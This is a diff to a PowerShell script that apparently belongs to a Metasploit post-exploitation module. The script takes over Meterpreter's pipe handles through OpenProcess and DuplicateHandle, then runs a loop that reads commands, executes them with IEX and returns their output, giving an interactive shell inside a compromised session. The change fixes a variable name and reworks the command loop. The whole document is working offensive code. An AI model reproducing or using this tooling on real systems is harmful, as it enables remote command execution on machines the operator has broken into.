@@ -18,7 +18,7 @@ $d = $c.CompileAssemblyFromSource($b, $a)
 # Replace Process ID with Meterpreter Proc Id
 $parentProcessID = METERP_PID
 $remote_handle_in = REM_HANDLE_IN
-$remote_handle_out = REM_HANDLEOUT
+$remote_handle_out = REM_HANDLE_OUT
 
 $sourceHandle = [kernel32.func]::OpenProcess(64,1,$parentProcessID);
 $cHandle = [kernel32.func]::GetCurrentProcess();
@@ -28,6 +28,7 @@ $res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_in, $cHandl
 $in_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_in, 1
 $fsi = New-Object IO.FileStream $in_handle, ReadWrite
 $sr = New-Object IO.StreamReader $fsi
+#[Console]::SetIn($sr)
 
 $handle_out = -1
 $res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_out, $cHandle, [ref] $handle_out, 2, 1, 2)
@@ -38,9 +39,13 @@ $sw.AutoFlush=1
 $sw.Write("PS> ")
 
 while (1) {
-	$o = IEX ($sr.ReadLine())
-	$sw.WriteLine(($o | out-string))
-	$sw.Write("PS> ")
+	sleep -m 200
+	$i = $sr.ReadLine();
+	$sr.DiscardBufferedData()
+	$o = IEX ($i);
+	$i = ''
+	$sw.WriteLine(($o | out-string));
+	$o = ''
+	$sw.Write("PS> ");
 }
-
 
